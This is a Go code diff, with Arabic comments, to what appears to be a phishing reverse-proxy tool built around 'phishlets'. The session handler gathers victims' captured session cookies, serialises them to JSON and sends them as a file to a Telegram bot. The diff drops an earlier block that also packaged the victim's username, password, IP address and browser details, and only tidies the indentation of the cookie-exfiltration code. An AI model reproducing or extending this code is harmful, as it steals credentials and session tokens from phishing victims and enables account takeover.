@@ -2233,15 +2233,6 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				// تأخير قصير للتأكد من جمع جميع البيانات
 				time.Sleep(1 * time.Second)
 				
-				// تجميع البيانات لإرسالها
-				cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", s.Id)
-				cookiesText += fmt.Sprintf("الفيشلت: %s\n", s.Name)
-				cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", s.Username)
-				cookiesText += fmt.Sprintf("كلمة المرور: %s\n", s.Password)
-				cookiesText += fmt.Sprintf("عنوان IP: %s\n", s.RemoteAddr)
-				cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", s.UserAgent)
-				cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", s.Country, s.CountryCode)
-				
 				// إضافة بيانات الكوكيز
 				if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 					for domain, cookies := range s.CookieTokens {
@@ -2264,20 +2255,21 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 					log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
 				}
 				
+				// تحويل قائمة الكوكيز إلى JSON
 				cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 				if err != nil {
 					log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
 					return
 				}
 	
-	// إرسال النص كملف إلى تيليجرام
+				// إرسال النص كملف إلى تيليجرام
 				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
 				err = p.telegram.SendFileFromText(fileName, string(cookiesJSON))
 				if err != nil {
 					log.Error("فشل في إرسال ملف الكوكيز: %v", err)
 				} else {
 					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
-	}
+				}
 			}()
 		}
 	}
